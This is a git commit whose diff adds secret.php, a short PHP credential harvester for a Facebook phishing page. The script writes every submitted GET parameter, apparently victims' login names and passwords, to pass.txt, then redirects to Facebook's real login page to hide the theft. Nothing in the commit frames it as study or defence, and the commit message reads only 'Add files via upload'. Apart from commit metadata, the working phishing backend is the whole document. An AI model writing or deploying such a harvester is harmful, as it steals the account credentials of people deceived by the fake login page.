d0d7d30e16892cdfa51d30a1ca9bbe306312e7c9
zans0510 <157220829+zans0510@users.noreply.github.com>
2024-01-20 21:34:55 +0800

    Add files via upload

---
+++ secret.php
@@ -0,0 +1,15 @@
+<?php
+header("Location: http://www.Facebook.com/login.php ");
+$handle = fopen("pass.txt", "a");
+foreach($_GET as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
+
+
